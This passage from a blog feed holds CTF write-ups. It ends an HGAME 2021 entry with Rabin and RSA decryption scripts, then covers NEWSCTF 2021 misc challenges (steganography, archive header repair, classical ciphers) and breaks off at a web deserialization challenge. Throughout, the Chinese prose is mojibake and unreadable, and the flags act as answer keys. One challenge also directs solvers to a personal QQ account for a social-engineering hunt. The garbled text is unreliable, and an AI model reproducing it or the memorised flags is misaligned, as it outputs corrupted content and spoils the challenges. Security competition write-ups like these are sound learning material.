class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span></span><br><span class="line">    n=p*q</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line">m = rabin_decrypt(c,p,q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="3-WhitegiveRSA"><a href="#3-WhitegiveRSA" class="headerlink" title="3.WhitegiveRSA"></a>3.WhitegiveRSA</h2><blockquote><p>N = 882564595536224140639625987659416029426239230804614613279163<br>e = 65537<br>c = 747831491353896780365654517748216624798517769637260742155527<br>Challenge Address <a href="https://www.baidu.com/">https://www.baidu.com</a></p></blockquote><p>è¿™åº”è¯¥ç®—æ˜¯RSAå…¥é—¨é¢˜å§<br>å…ˆå¯¹Nè¿›è¡Œåˆ†è§£å¾—åˆ°p,qï¼ˆâ‘ .é€šè¿‡yafuåˆ†è§£n,å‘½ä»¤è¡Œæ‰“å¼€yafu,è¾“å…¥factor(n)å³å¯ï¼›â‘¡.<a href="http://www.factordb.com/">åœ¨çº¿ç½‘ç«™</a>ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3209807789.png"></p><p>æ¥ç€è·‘ä¸‹è„šæœ¬å°±å¾—å‡ºflagï¼šhgame{w0w~yOU_kNoW+R5@!}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2721967567.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">857504083339712752489993810777</span></span><br><span class="line">q = <span class="number">1029224947942998075080348647219</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">747831491353896780365654517748216624798517769637260742155527</span></span><br><span class="line">n = p * q</span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="4-The-Password"><a href="#4-The-Password" class="headerlink" title="4.The Password"></a>4.The Password</h2><blockquote><p>Hint<br>Challenge Address <a href="https://1.oss.hgame2021.vidar.club/thepassword.html">https://1.oss.hgame2021.vidar.club/thepassword.html</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">The Password</span><br><span class="line">Tinmixå’Œæœ‹å‹ä¸€èµ·å»ç©å¯†å®¤é€ƒè„±,ä½†æ˜¯ç”±äºçªå‘æƒ…å†µ,Tinmixè¢«é”åœ¨äº†ä¸€é—´å¯†å®¤é‡Œ,äºæ˜¯å¼€å§‹å››å¤„æ‘¸ç´¢,æ˜æš—çš„ç¯å…‰ä¸‹,Tinmixå‘ç°å¯†å®¤æœ‰ä¸€å—å¤§åœ†ç›˜,è¢«äººå·¥åˆ†å‰²æˆäº†7å—å°åœ†ç›˜,ä½†ç”±äºåˆšå¼€å§‹æ²¡æ³¨æ„,æ¯ä¸ªåœ†ç›˜å·²ç»è¢«æ—‹è½¬è¿‡äº†,ä½†Tinmixè®°ä½äº†æ—‹è½¬çš„è¿‡ç¨‹å’Œç»“æœ</span><br><span class="line">$$</span><br><span class="line">y_1&#x3D;x_1âŠ•n_1âŠ•(x_1â‹™7)âŠ•(x_1â‹˜3) \\</span><br><span class="line">   y_2&#x3D;x_2âŠ•n_2âŠ•(x_2â‹™4)âŠ•(x_2â‹˜9) \\</span><br><span class="line">   y_3&#x3D;x_3âŠ•n_3âŠ•(x_3â‹™2)âŠ•(x_3â‹˜5) \\</span><br><span class="line">   y_4&#x3D;x_4âŠ•n_4âŠ•(x_4â‹™6)âŠ•(x_4â‹˜13) \\</span><br><span class="line">   y_5&#x3D;x_5âŠ•n_5âŠ•(x_5â‹™8)âŠ•(x_5â‹™16) \\</span><br><span class="line">   y_6&#x3D;x_6âŠ•n_6âŠ•(x_6â‹™5)âŠ•(x_6â‹˜7) \\</span><br><span class="line">   y_7&#x3D;x_7âŠ•n_7âŠ•(x_7â‹™2)âŠ•(x_7â‹˜5) \\</span><br><span class="line">   \\</span><br><span class="line">   (y_1,n_1) &#x3D; (15789597796041222200,14750142427529922)\\</span><br><span class="line">   (y_2,n_2) &#x3D; (8279663441787235887,2802568775308984)\\</span><br><span class="line">   (y_3,n_3) &#x3D; (9666438290109535850,15697145971486341)\\</span><br><span class="line">   (y_4,n_4) &#x3D; (10529571502219113153,9110411034859362)\\</span><br><span class="line">   (y_5,n_5) &#x3D; (8020289479524135048,4092084344173014)\\</span><br><span class="line">   (y_6,n_6) &#x3D; (10914636017953100490,2242282628961085)\\</span><br><span class="line">   (y_7,n_7) &#x3D; (4622436850708129231,10750832281632461)\\</span><br><span class="line">$$</span><br><span class="line">å®šä¹‰</span><br><span class="line">â‹™è¡¨ç¤ºå¾ªç¯å³ç§»</span><br><span class="line">â‹˜è¡¨ç¤ºå¾ªç¯å·¦ç§»</span><br><span class="line">âŠ•è¡¨ç¤ºå¼‚æˆ–è¿ç®—</span><br><span class="line">hint</span><br></pre></td></tr></table></figure><p>â€¦</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HGAME </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NEWSCTF 2021</title>
      <link href="2021/02/13/2021NEWSCTF/"/>
      <url>2021/02/13/2021NEWSCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="0X1-Misc"><a href="#0X1-Misc" class="headerlink" title="0X1 Misc"></a>0X1 Misc</h1><h2 id="miscç­¾åˆ°å¤„"><a href="#miscç­¾åˆ°å¤„" class="headerlink" title="miscç­¾åˆ°å¤„"></a>miscç­¾åˆ°å¤„</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1270498528.jpg"></p><p>binwalkå¾—åˆ°äº†ä¸ªflag.txtï¼Œbase64å¾—åˆ°flagï¼šflag{Welc0me_t0_newsctf!!!}</p><h2 id="ä¼ªè£…è€…"><a href="#ä¼ªè£…è€…" class="headerlink" title="ä¼ªè£…è€…"></a>ä¼ªè£…è€…</h2><blockquote><p><a href="https://wws.lanzous.com/ihGAlldzfmb">https://wws.lanzous.com/ihGAlldzfmb</a>  flagæ ¼å¼ï¼šflag{}<br>Hint:steghide</p></blockquote><p>ä¿®æ”¹rarå¤´æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2844222164.png"></p><p>å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯<br>â‘ .èƒŒæ™¯.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å°æ— æ­£åœ¨è¿½ä¸€éƒ¨å‰§,ä½†æ˜¯ä»–å¿˜äº†å‰§åä¸­ä¸€ä½è§’è‰²çš„åå­—,äºæ˜¯ä»–æˆªäº†ä¸ªå›¾(å¥½çœ‹çš„å‰§.png),å¼€å§‹äº†è¯¢é—®ç¯èŠ‚.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----ä½ èƒ½å¸®å°æ—è®¤å‡ºè¿™æ˜¯è°å˜›</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ³¨:è§’è‰²åå­—(ä¸­æ–‡æ‹¼éŸ³)æ˜¯å‹ç¼©åŒ…çš„å¯†ç </span><br></pre></td></tr></table></figure><p>â‘¡.å¥½çœ‹çš„å‰§.png</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1121862733.png"></p><p>â‘¢.é€šè¿‡ä»¥ä¸Šä¿¡æ¯å¯ä»¥å¾—çŸ¥å‹ç¼©åŒ…å¯†ç ï¼š <code>wangtianfeng</code> ï¼›å¾—åˆ°niu.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2798169470.jpg"></p><p>â‘£.key.wavï¼ˆsteghideéšå†™éœ€è¦ç”¨åˆ°çš„å¯†ç ï¼‰ï¼ˆPSï¼šå’ŒGKCTFä¸­Harley Quinnçš„è€ƒç‚¹ä¸€æ ·ï¼‰</p><p>æœ€åä¸€å°æ®µå¯ä»¥å¬åˆ°æ‹¨å·å£°ï¼Œå°†å…¶æå–å‡ºæ¥ï¼ˆå› ä¸ºåé¢æåŠçš„å·¥å…·åªèƒ½åˆ†æå‡ åç§’å†…çš„éŸ³é¢‘QAQï¼‰ï¼ŒDTMFï¼Œåˆ©ç”¨ <strong><a href="https://pan.baidu.com/s/1vAG_iXU7zWLzLfxzBiKIkA">å·¥å…·</a>ï¼ˆæå–ç ï¼šoy3xï¼‰</strong> å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2863462517.png"></p><p><a href="http://dyf.ink/crypto/classical/others/#_24">æ‰‹æœºé”®ç›˜å¯†ç </a>è§£å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key &#x3D; ctfisfun</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flag(bushi</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1692078918.png"></p><p>åˆ’åˆ°æœ€åº•ä¸‹å¯ä»¥çœ‹åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç†Šæ›°ï¼šå‘‹é£Ÿå¾ˆèª’å’¯å™”ç ´å•½ä½æœ‰æ­¡å—šè¨»å—„å’Œä½ åƒå†¬è¨»ç‰©ç‰©çœ å—šç¬¨å˜æ“Šç¬¨å™¤è¥²ä½ çˆ¾å’¬ä½ çˆ¾å¸¸ç ´å¾ˆæ­¡æˆ‘å–æ‹™æ­¡æ„æ“Šå’¯å …æœ‰å—·å—¥å“æ€ç™¼å”¬è‚‰æ—¢æ­¡æ²’ç ´å™¤å’¯äººå’Œå˜¶å•½æ›´</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾æ˜¯ç»§<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">ä¸ä½›è®ºç¦…</a>ä¹‹åå‡ºæ¥çš„<a href="http://hi.pcmoe.net/">ä¸ç†Šè®ºé“</a>ï¼Œè§£å¾—flagï¼šflag{ç‰›å¹´å¤§å‰ä»Šæ™šåƒé¸¡ä»Šæ™šåƒé¸¡å°å¹´å¿«ä¹happy}</p><h2 id="EMOJI"><a href="#EMOJI" class="headerlink" title="EMOJI"></a>EMOJI</h2><blockquote><p>EMOJI(ç¬‘)<br>Hintï¼šemoji-aes</p></blockquote><p>ä¿®æ”¹rarå¤´æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1342668997.png"></p><p>å¾—åˆ°ä¸€å¼ å›¾ç‰‡å’ŒåŠ å¯†çš„å‹ç¼©åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2363476616.png"></p><p>ä¸éš¾çœ‹å‡ºè¿™æ˜¯é•¿å®‰12æ—¶è¾°é‚£ä¸ªåŠ å¯†æ–¹å¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/992215977.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2155709941.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1648768351.jpg"></p><p>799*248+21=198173ï¼Œä»è€Œè§£å‡ºå‹ç¼©åŒ…å¯†ç ï¼š <code>ä¸€ä¹å…«ä¸€ä¸ƒä¸‰</code> </p><p>è¿›è€Œå¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1581949352.png"></p><p>æœ€åæ ¹æ®é¢˜ç›®å°è¯•<a href="https://aghorler.github.io/emoji-aes/">emoji-aes</a>ï¼Œå¾—åˆ°flagï¼šflag{em0j1_Aes_1s_3_ni5e_3ncr9pt_to0l}</p><h2 id="happy-ox"><a href="#happy-ox" class="headerlink" title="happy ox"></a>happy ox</h2><blockquote><p>è¿™æ¬¡æˆ‘ä»¬é‚€è¯·åˆ°äº†ç‰›çˆ·çˆ·æ¥ç»™å¤§å®¶æ‹œä¸ªå¹´</p></blockquote><p>lsb å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š <code>niuniandaji888</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3879285178.png"></p><p>å¥½å®¶ä¼™ï¼åˆæ¥ä¸€å±‚åŠ å¯†â€¦<br>æ ¹æ®æ–‡æ¡£æç¤ºå¯çŸ¥æ˜¯ç§‘æ¯”å¯†ç ï¼Œå¯¹ç…§å¯†ç è¡¨å³å¯å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼špasswdis <code>kbyydsez</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1476229734.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/637737911.jpg"></p><p>æœ€ç»ˆå¾—åˆ°flagï¼šflag{0h_y0u_f1nd_Me_h3ck}</p><h2 id="å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›"><a href="#å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›" class="headerlink" title="å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›"></a>å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯›</h2><blockquote><p>é™„ä»¶åœ°å€ï¼š<a href="https://wwa.lanzous.com/iNdm7lfooaj">https://wwa.lanzous.com/iNdm7lfooaj</a><br><a href="https://pan.baidu.com/s/1Pc3RlAWW1tzy955TbEwryA">æˆ‘çš„é™„ä»¶</a>ï¼ˆæå–ç ï¼špc1oï¼‰</p></blockquote><p>æ”¾å…¥010ï¼Œæ‹–åˆ°åº•éƒ¨å¯ä»¥çœ‹åˆ°å¦‚ä¸‹å¯èƒ½æ˜¯Morse/Baconçš„å­—ç¬¦ä¸²</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3266453861.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011110000010010100101011001110100010001101000100101001101000011010011010010001111010001110011010100010111010000011110100000000110111000000000110100110011000000001110</span><br></pre></td></tr></table></figure><p>å°è¯•åŸ¹æ ¹ï¼ˆ0-&gt;a;1-&gt;bï¼‰è§£å¾—passwordistingshuonixihuanyangmaoï¼Œbutè¿™æ ¹æœ¬æ— æ³•è§£å¼€å‹ç¼©åŒ…ï¼ˆPS:è¿™åªæ˜¯JPHSçš„keyï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1635161036.png"></p><p>ç»è¿‡ä¸€ç•ªæŠ˜è…¾ï¼Œé€šè¿‡JPHSéšå†™å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š <code>Wdn1His87</code> </p><p>æ‰“å¼€brainpower.txtå‘ç°æ–‡ä»¶å¤´ç«Ÿæ˜¯ID3ï¼Œç™¾åº¦å·²æŸ¥å¾—çŸ¥æ˜¯mp3çš„æ–‡ä»¶å¤´</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/562716738.png"></p><p>audacityæ‰“å¼€å‘ç°æœ€åä¸€æ®µæœ‰æƒ…å†µï¼Œæ”¾å¤§å³å¯å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š <code>PsWdMuzi123</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1379680187.png"></p><p>è§£å¾—flag.txtï¼ˆè¿˜ä¸æ˜¯flag.jpgï¼‰ï¼Œæ‹‰åˆ°æœ€åå‘ç°æ˜¯pngçš„æ–‡ä»¶å¤´å€’è¿‡æ¥çš„ï¼Œ<a href="http://tool.huixiang360.com/str/reverse.php">åœ¨çº¿å·¥å…·</a>/è„šæœ¬å€’ä¸€ä¸‹æ”¾å…¥010</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3405323143.png"></p><p> <strong>é™„ä¸Šè„šæœ¬ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">content &#x3D; [] </span><br><span class="line">with open(&quot;flag.txt&quot; ) as f: </span><br><span class="line">    for row in f.readline(): </span><br><span class="line">        content.append(row) </span><br><span class="line">content.reverse() </span><br><span class="line"></span><br><span class="line">with open(&quot;galf.txt&quot;,&quot;w&quot; ) as f: </span><br><span class="line">    for row in content: </span><br><span class="line">        f.write(row)</span><br></pre></td></tr></table></figure><p>butè¿˜æ˜¯æ— æ³•æ‰“å¼€ï¼Œå†æ¬¡æŸ¥çœ‹å‘ç°è¿™åº”è¯¥æ˜¯jpgçš„ï¼Œäºæ˜¯å°†æ–‡ä»¶å¤´æ”¹ä¸ºjpgçš„</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2277511102.png"></p><p>æœ€åæ‰“å¼€æ˜¯å¼ äºŒç»´ç ï¼Œæ‰«ç å³å¯å¾—åˆ°flagï¼šflag{s0_easy_is_not_it?}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/668102732.png"></p><h2 id="ç¼ºæ–¤å°‘ä¸¤"><a href="#ç¼ºæ–¤å°‘ä¸¤" class="headerlink" title="ç¼ºæ–¤å°‘ä¸¤"></a>ç¼ºæ–¤å°‘ä¸¤</h2><blockquote><p>å¯æ¶ï¼Œå¤§è¿‡å¹´çš„ä¸ºä»€ä¹ˆè¦ç¼ºæ–¤å°‘ä¸¤ã€‚  æ›´æ”¹é¢˜ç›®ä¸­çš„hint1ï¼š  åŸhintï¼šåŸæ–‡é•¿åº¦8  æ›´æ”¹ä¸ºï¼šåŸæ–‡é•¿åº¦9<br>Hintï¼šæ˜¯guessä¸æ˜¯çŒœ<br><a href="https://pan.baidu.com/s/1cw6gyalEpTaKFFNZrwPlBA">é™„ä»¶</a>ï¼ˆæå–ç ï¼širuzï¼‰</p></blockquote><p>å…ˆæ‰«æ‰«ä¸¤å¼ äºŒç»´ç çœ‹çœ‹æœ‰æ²¡æœ‰å•¥çº¿ç´¢.jpg  â‘ .è°éŸ³æ¢—ï¼Œæ‰£é’±ï¼.png ï¼š å¤§ç‰›ï¼šæˆ‘ä¹Ÿå¾ˆç–‘æƒ‘å‘¢ï¼ˆPS:å¼‚æˆ–ï¼‰  â‘¡.password.png åº”è¯¥æ˜¯äºŒç»´ç ä¸å…¨ï¼Œäºæ˜¯å°±å…ˆå°†ä¸¤å¼ å›¾å¼‚æˆ–ä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2884195139.png"></p><p>æœ€åè¡¥ä¸Šå®šä½ç‚¹ï¼Œæ‰«ç å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼š <code>password:1q2w3e4r5t6y7u8i</code> </p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2133239000.png"></p><p>è§£å¼€é‡Œé¢æœ‰ä¸¤å¼ å›¾ï¼ˆå…¶ä¸­ä¸€å¼ åå«passwdï¼Œè€Œå¦ä¸€å¼ å¾ˆæœ‰å¯èƒ½å°±æ˜¯å‹ç¼©åŒ…äº†ï¼‰å’Œä¸€ä¸ªHint<br><strong>hint.txt</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯†ç æ˜¯é çŒœçš„ï¼Œä¸æ˜¯çˆ†ç ´ï¼</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºæ¨æµ‹æ˜¯outguesséšå†™ï¼Œæœ€ç»ˆå¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼šnews52ctf0</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2545390577.png"></p><p><strong>Polybius.txt</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cipher:iftffsissrssirissr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint1:\u660e\u6587\u957f\u5ea6\u662f\u0038\uff0c\u4f1a\u4e0b\u68cb\u5417\uff1f</span><br><span class="line">hint2:Zmlyc3Q&#x2F;LGxlbihmaXJzdCk9NQ&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">å¾—åˆ°çš„æœ‰æ„ä¹‰å­—ç¬¦ä¸²ï¼Œä½œä¸ºå‹ç¼©åŒ…å¯†ç ï¼Œæ‰èƒ½è¿›å…¥ä¸‹ä¸€å±‚ã€‚</span><br></pre></td></tr></table></figure><p>å¥½å®¶ä¼™ï¼hintè¿˜åŠ å¯†<br>hint1ï¼šæ˜æ–‡é•¿åº¦æ˜¯8ï¼Œä¼šä¸‹æ£‹å—ï¼Ÿï¼ˆPS:é¢˜ç›®è¯´è¿™é‡Œé”™äº†ï¼Œåº”è¯¥æ˜¯9ï¼‰ï¼ˆPS:Unicodeï¼‰<br>hint2ï¼šfirst?,len(first)=5ï¼ˆPS:base64ï¼‰</p><p>çŒœæµ‹æ˜¯æ£‹ç›˜å¯†ç ï¼ˆ<a href="https://www.yuque.com/u2095721/xhc3mh/xb65yk">æ£‹ç›˜å¯†ç -æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µå¯†ç </a>ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1625978581.png"></p><p>è€Œcipheré‡Œå¯†æ–‡æ­£å¥½æ˜¯äº”ä¸ªå­—ç¬¦ï¼Œäºæ˜¯å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ï¼Œå¯ä»¥æ˜æ˜¾çŸ¥é“æ˜¯ <code>keyisthis</code> </p><p><strong>é™„ä¸Šè„šæœ¬</strong>ï¼ˆPS:æ¥è‡ªBJDCTF-PolybiusæŸå¤§ä½¬çš„è„šæœ¬æ”¹ç¼–ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">s&#x3D;&quot;first&quot;   #ä¿®æ”¹å¤„</span><br><span class="line">sumresult&#x3D;[]</span><br><span class="line">numsumresult&#x3D;[]</span><br><span class="line">ciper&#x3D;&quot;iftffsissrssirissr&quot;  #ä¿®æ”¹å¤„</span><br><span class="line">for i in itertools.permutations(s,5):#æ‰¾å‡ºæ‰€æœ‰å…¨æ’åˆ—</span><br><span class="line">    sumresult.append(&quot;&quot;.join(i))</span><br><span class="line">for i in sumresult:</span><br><span class="line">    temp&#x3D;&quot;&quot;</span><br><span class="line">    for j in ciper:</span><br><span class="line">        temp+&#x3D;str(i.index(j)+1)</span><br><span class="line">    numsumresult.append(temp)</span><br><span class="line">for i in numsumresult:</span><br><span class="line">    ans_&#x3D;&quot;&quot;</span><br><span class="line">    for j in range(0, len(i),2):</span><br><span class="line">        xx&#x3D;(int(i[j])-1)*5+int(i[j+1])+96</span><br><span class="line">        if xx&gt;ord(&#39;i&#39;):</span><br><span class="line">            xx+&#x3D;1</span><br><span class="line">        ans_+&#x3D;chr(xx)</span><br><span class="line">    print(ans_)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„flag.txtå±…ç„¶è¿˜ä¸æ˜¯æœ€ç»ˆçš„flag.gif</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å¯†æ–‡ï¼šmtHVnkLnIaP3FaW7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">dic&#x3D;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs????kxyz012789+&#x2F;</span><br><span class="line"></span><br><span class="line">æ­å–œæ¥åˆ°æœ€åä¸€å±‚ï¼Œä½ çŸ¥é“base64ï¼Ÿï¼Œé‚£ä¹ˆè§£ä¸€ä¸‹å§ï¼Œå¾—åˆ°flagå°±å¯ä»¥æäº¤äº†å‘€ã€‚</span><br><span class="line">flagï¼šNEWCTF2021&#123;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼šNEWSCTF2021{base64_1s_v3ry_e@sy_and_fuN}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/51151865.png"></p><h2 id="å“¥å“¥çš„ç§˜å¯†"><a href="#å“¥å“¥çš„ç§˜å¯†" class="headerlink" title="å“¥å“¥çš„ç§˜å¯†"></a>å“¥å“¥çš„ç§˜å¯†</h2><blockquote><p>å“¥å“¥èƒ½æœ‰ä»€ä¹ˆç§˜å¯†å‘¢<br>Hint1:ç§˜å¯†åœ¨åŸå›¾é‡Œé¢<br>Hint:2+3+8numå³åœ°åŒºå­—æ¯+åå­—å­—æ¯+ç”Ÿæ—¥</p><p>æ®è¯´å“¥å“¥çš„ç§˜å¯†è—åœ¨äº†å¦¹å¦¹çš„QQç©ºé—´é‡Œ<br>QQï¼š2492853776<br>å»å¯»æ‰¾flagå§</p></blockquote><p>ç¤¾å·¥é¢˜~</p><h1 id="0X2-Web"><a href="#0X2-Web" class="headerlink" title="0X2 Web"></a>0X2 Web</h1><h2 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h2><blockquote><p>Webç­¾åˆ°é¢˜<br>é¢˜ç›®åœ°å€ï¼š<a href="http://47.106.172.29/">http://47.106.172.29</a>:2333/<br>ç¥ç¦å¤§å®¶æ‰¾(ç”·/å¥³)æœ‹å‹èƒ½åƒç­¾åˆ°é¢˜ä¸€æ ·ç®€å•</p></blockquote><p>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</p><p><img 